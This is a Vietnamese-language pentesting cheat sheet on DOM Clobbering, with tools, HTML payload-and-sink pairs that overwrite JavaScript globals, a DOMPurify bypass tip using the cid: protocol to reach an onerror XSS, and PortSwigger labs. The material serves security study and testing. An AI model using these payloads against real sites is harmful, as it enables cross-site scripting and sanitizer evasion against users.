# DOM Clobbering

> DOM Clobbering là một kỹ thuật trong đó các biến toàn cục (global variables) có thể bị ghi đè hoặc "làm nhiễu" (clobbered) bằng cách đặt tên cho các phần tử HTML với những ID hoặc name nhất định. Điều này có thể gây ra hành vi bất thường trong các đoạn script và tiềm ẩn nguy cơ dẫn đến lỗ hổng bảo mật.

## Tóm tắt

- [Công cụ](#tools)
- [Phương pháp](#methodology)
- [Bài Lab](#labs)
- [Tài Liệu Tham Khảo](#references)

## Công cụ

- [SoheilKhodayari/DOMClobbering](https://domclob.xyz/domc_markups/list) - Danh sách toàn diện các payload DOM Clobbering cho trình duyệt web trên di động và desktop
- [yeswehack/Dom-Explorer](https://github.com/yeswehack/Dom-Explorer) - Một công cụ web được thiết kế để kiểm thử nhiều loại trình phân tích cú pháp (parser) và bộ lọc (sanitizer) HTML khác nhau.
- [yeswehack/Dom-Explorer Live](https://yeswehack.github.io/Dom-Explorer/dom-explorer#eyJpbnB1dCI6IiIsInBpcGVsaW5lcyI6W3siaWQiOiJ0ZGpvZjYwNSIsIm5hbWUiOiJEb20gVHJlZSIsInBpcGVzIjpbeyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiJhYjU1anN2YyIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ==) - Cho thấy cách trình duyệt phân tích cú pháp HTML và phát hiện các lỗ hổng XSS bị biến đổi (mutated XSS)

## Phương pháp

Việc khai thác đòi hỏi phải có bất kỳ hình thức `HTML injection` nào trên trang.

- Clobbering `x.y.value`

    ```html
    // Payload
    <form id=x><output id=y>I've been clobbered</output>

    // Sink
    <script>alert(x.y.value);</script>
    ```

- Clobbering `x.y` bằng cách dùng thuộc tính ID và name cùng nhau để tạo thành một tập hợp (collection) DOM

    ```html
    // Payload
    <a id=x><a id=x name=y href="Clobbered">

    // Sink
    <script>alert(x.y)</script>
    ```

- Clobbering `x.y.z` - sâu 3 cấp

    ```html
    // Payload
    <form id=x name=y><input id=z></form>
    <form id=x></form>

    // Sink
    <script>alert(x.y.z)</script>
    ```

- Clobbering `a.b.c.d` - hơn 3 cấp

    ```html
    // Payload
    <iframe name=a srcdoc="
    <iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
    <style>@import '//portswigger.net';</style>

    // Sink
    <script>alert(a.b.c.d)</script>
    ```

- Clobbering `forEach` (chỉ trên Chrome)

    ```html
    // Payload
    <form id=x>
    <input id=y name=z>
    <input id=y>
    </form>

    // Sink
    <script>x.y.forEach(element=>alert(element))</script>
    ```

- Clobbering `document.getElementById()` bằng cách dùng thẻ `<html>` hoặc `<body>` có cùng thuộc tính `id`

    ```html
    // Payloads
    <html id="cdnDomain">clobbered</html>
    <svg><body id=cdnDomain>clobbered</body></svg>


    // Sink 
    <script>
    alert(document.getElementById('cdnDomain').innerText);//clobbbered
    </script>
    ```

- Clobbering `x.username`

    ```html
    // Payload
    <a id=x href="ftp:Clobbered-username:Clobbered-Password@a">

    // Sink
    <script>
    alert(x.username)//Clobbered-username
    alert(x.password)//Clobbered-password
    </script>
    ```

- Clobbering (chỉ trên Firefox)

    ```html
    // Payload
    <base href=a:abc><a id=x href="Firefox<>">

    // Sink
    <script>
    alert(x)//Firefox<>
    </script>
    ```

- Clobbering (chỉ trên Chrome)

    ```html
    // Payload
    <base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>

    // Sink
    <script>
    alert(x.xyz)//a://Clobbered<>
    </script>
    ```

## Mẹo

- DomPurify cho phép giao thức `cid:`, giao thức này không mã hóa dấu ngoặc kép (`"`): `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`

## Bài Lab

- [PortSwigger - Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
- [PortSwigger - Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
- [PortSwigger - DOM clobbering test case protected by CSP](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/)

## Tài Liệu Tham Khảo

- [Bypassing CSP via DOM clobbering - Gareth Heyes - June 5, 2023](https://web.archive.org/web/20251114182213/https://portswigger.net/research/bypassing-csp-via-dom-clobbering)
- [DOM Clobbering - HackTricks - January 27, 2023](https://web.archive.org/web/20241215205040/https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
- [DOM Clobbering - PortSwigger - September 25, 2020](https://web.archive.org/web/20260218083100/https://portswigger.net/web-security/dom-based/dom-clobbering)
- [DOM Clobbering strikes back - Gareth Heyes - February 6, 2020](https://web.archive.org/web/20200224065316/https://portswigger.net/research/dom-clobbering-strikes-back)
- [Hijacking service workers via DOM Clobbering - Gareth Heyes - November 29, 2022](https://web.archive.org/web/20260123013910/https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
